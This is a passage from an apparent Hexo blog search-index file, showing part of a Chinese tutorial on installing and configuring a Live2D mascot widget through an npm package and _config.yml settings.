bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install live2d-widget-model-shizuku</span><br></pre></td></tr></table></figure><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>配置Hexo的主<code>_config.yml</code>或者使用的主题的<code>_config.yml</code></p><p>添加以下代码到配置文件中：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">## Live2D看板娘</span><br><span class="line">live2d<span class="punctuation">:</span></span><br><span class="line">  enable<span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">  pluginModelPath<span class="punctuation">:</span> assets/</span><br><span class="line">  model<span class="punctuation">:</span></span><br><span class="line">    #模板目录，在node_modules里</span><br><span class="line">    use<span class="punctuation">:</span> live2d-widget-model-shizuku  </span><br><span class="line">  display<span class="punctuation">:</span></span><br><span class="line">    position<span class="punctuation">:</span> right</span><br><span class="line">    width<span class="punctuation">:</span> <span class="number">300</span> </span><br><span class="line">    height<span class="punctuation">:</span> <span class="number">600</span></span><br><span class="line">  mobile<span class="punctuation">:</span></span><br><span class="line">    # 在手机端显示</span><br><span class="line">    show<span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span>   </span><br><span class="line">  rect<span class="punctuation">:</span></span><br><span class="line">    opacity<span class="punctuation">:</span><span class="number">0.7</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Basic </category>
          
      </categories>
      
      
    </entry>
    
    
  
  
</search>
